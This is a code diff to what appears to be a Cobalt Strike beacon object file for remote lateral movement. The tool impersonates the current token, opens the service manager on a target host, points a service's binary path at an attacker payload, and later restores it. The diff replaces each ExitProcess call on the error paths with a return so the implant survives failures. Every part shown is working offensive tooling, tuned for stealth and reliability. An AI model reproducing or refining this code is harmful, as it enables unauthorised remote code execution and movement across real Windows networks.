@@ -6,7 +6,6 @@
 
 #define LOGON32_LOGON_NEW_CREDENTIALS 9
 
-DECLSPEC_IMPORT VOID WINAPI kernel32$ExitProcess(UINT);
 DECLSPEC_IMPORT BOOL WINAPI Advapi32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
 DECLSPEC_IMPORT BOOL WINAPI Advapi32$ImpersonateLoggedOnUser(HANDLE);
 DECLSPEC_IMPORT SC_HANDLE WINAPI Advapi32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
@@ -45,20 +44,20 @@ void go(char * args, int length) {
 	BeaconPrintf(CALLBACK_OUTPUT,  "Using current process context for authentication. (Pass the hash)\n");
 	if(!Advapi32$OpenProcessToken(kernel32$GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
 		BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$OpenProcessToken failed %ld\n", kernel32$GetLastError());
-		kernel32$ExitProcess(0);
+		return;
 	}
 
     bResult = FALSE;
     bResult = Advapi32$ImpersonateLoggedOnUser(hToken);
     if(!bResult) {
         BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$ImpersonateLoggedOnUser failed %ld\n", kernel32$GetLastError());
-        kernel32$ExitProcess(0);
+        return;
     }
 
     SC_HANDLE schManager = Advapi32$OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
     if(schManager == NULL) {
         BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$OpenSCManagerA failed %ld\n", kernel32$GetLastError());
-        kernel32$ExitProcess(0);
+        return;
     }
     BeaconPrintf(CALLBACK_OUTPUT, "SC_HANDLE Manager 0x%p\n", schManager);
 
@@ -67,7 +66,7 @@ void go(char * args, int length) {
     if(schService == NULL) {
 	Advapi32$CloseServiceHandle(schManager);
         BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$OpenServiceA failed %ld\n", kernel32$GetLastError());
-        kernel32$ExitProcess(0);
+        return;
     }
     BeaconPrintf(CALLBACK_OUTPUT, "SC_HANDLE Service 0x%p\n", schService);
 
@@ -88,7 +87,7 @@ void go(char * args, int length) {
     bResult = Advapi32$ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, NULL, NULL, NULL, NULL, NULL, NULL);
     if(!bResult) {
         BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$ChangeServiceConfigA failed to update the service path. %ld\n", kernel32$GetLastError());
-        kernel32$ExitProcess(0);
+        return;
     }
     BeaconPrintf(CALLBACK_OUTPUT, "Service path was changed to \"%s\"\n", payload);
 
@@ -106,7 +105,7 @@ void go(char * args, int length) {
         bResult = Advapi32$ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, NULL, NULL, NULL, NULL, NULL, NULL);
         if(!bResult) {
             BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$ChangeServiceConfigA failed to revert the service path. %ld\n", kernel32$GetLastError());
-            kernel32$ExitProcess(0);
+            return;
         }
         BeaconPrintf(CALLBACK_OUTPUT, "Service path was restored to \"%s\"\n", originalBinaryPath);
     }
